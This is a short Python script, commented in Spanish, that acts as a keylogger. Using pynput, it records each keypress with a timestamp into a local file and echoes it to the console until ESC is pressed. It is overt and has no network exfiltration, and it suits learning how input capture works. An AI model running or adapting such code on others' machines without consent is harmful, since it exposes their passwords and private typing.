from pynput.keyboard import Listener, Key
from datetime import datetime

archivo = open("teclas.txt", "a")
def cuando_presiona(tecla):
    # Ignorar la tecla ESC y no guardarla
    if tecla == Key.esc:
        archivo.close()
        return False

    hora = datetime.now().strftime("%H:%M:%S")

    # Mostrar teclas especiales con nombre
    if hasattr(tecla, 'char'):
        archivo.write(f"[{hora}] {tecla.char}\n")
        print(f"[{hora}] Guardado: {tecla.char}")
    else:
        if tecla == Key.space:
            archivo.write(f"[{hora}] ESPACIO\n")
        elif tecla == Key.enter:
            archivo.write(f"[{hora}] ENTER\n")
        elif tecla == Key.backspace:
            archivo.write(f"[{hora}] BORRAR\n")
        elif tecla == Key.tab:
            archivo.write(f"[{hora}] TAB\n")

    archivo.flush()

print("Capturando teclas... (ESC para detener)")
with Listener(on_press=cuando_presiona) as detector:
    detector.join()